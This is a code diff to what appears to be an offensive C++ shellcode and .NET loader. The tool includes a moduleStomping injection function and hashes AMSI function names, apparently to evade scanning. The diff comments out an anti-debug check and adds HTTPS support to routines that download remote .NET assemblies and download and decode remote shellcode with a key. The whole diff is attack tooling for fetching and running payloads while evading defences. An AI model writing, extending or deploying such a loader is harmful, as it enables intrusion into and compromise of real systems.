@@ -171,12 +171,12 @@ void moduleStomping(int pid, unsigned char* shellcode, SIZE_T shellcode_len) {
 }
 //debug antiDebug;
 int main(int argc, char* argv[]) {
-	std::cout << "AmsiScanBuffer" << helperHandler.simpleHash("AmsiScanBuffer") << "\n";
-    if (antiDebug.checkDebug()) {
+	std::cout << "AmsiInitialize: " << helperHandler.simpleHash("AmsiInitialize") << "\n";
+    /*if (antiDebug.checkDebug()) {
         std::cout << "Hello world !!!";
         return 0;
     };
-    
+    */
     try {
         helper::Options opt = helperHandler.parseArgs(argc, argv);
 
@@ -186,10 +186,10 @@ int main(int argc, char* argv[]) {
             if(opt.useRemote){
                 std::cout << "[+] Remote dotnet\n";
 				std::wstring url = opt.url + opt.file;
-                InitDotnet(url, true, opt.args);
+                InitDotnet(url, true, opt.args, opt.https);
 			}
             else {
-                InitDotnet(opt.filePath, false, opt.args);
+                InitDotnet(opt.filePath, false, opt.args, opt.https);
             }
             
             std::cout << "Press Enter to exit...";
@@ -218,7 +218,8 @@ int main(int argc, char* argv[]) {
             shellcode_vector = helperHandler.fetchRemoteShellcodeAndDecode(
                 opt.url,
                 opt.file,
-                opt.key
+                opt.key,
+                opt.https
             );
             std::cout << "Downloaded bytes: " << shellcode_vector.size() << "\n";
             std::cout << "Decoding shellcode with key : " << (int)opt.key << "\n";
